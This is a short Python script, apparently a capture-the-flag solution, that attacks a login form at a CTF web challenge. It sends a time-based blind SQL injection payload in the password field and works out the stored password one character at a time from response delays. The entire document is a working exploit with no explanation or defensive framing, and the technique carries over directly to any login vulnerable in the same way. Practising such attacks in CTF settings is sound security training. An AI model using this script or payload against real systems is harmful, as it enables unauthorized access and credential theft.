import requests
import string

chars = string.printable

s = requests.session()

url = "https://cryptixctf.com/web3/login.php"
pass_len = 5 # little recon
passwd = ""

def get_payload(num, char):
    payload = "a' or (binary substring(password,{},1)='{}' or sleep(2))#".format(num, char)
    return payload

def is_cond_true(resp):
    return resp.elapsed.total_seconds() < 2

def send_req(num, char):
    return s.post(url, data={"pwd": get_payload(num, char)})

for i in range(30):
    print("Position:", i)
    for char in chars:
        r = send_req(i+1, char)
        if is_cond_true(r):
            passwd += char
            print("[+]", passwd)
            break
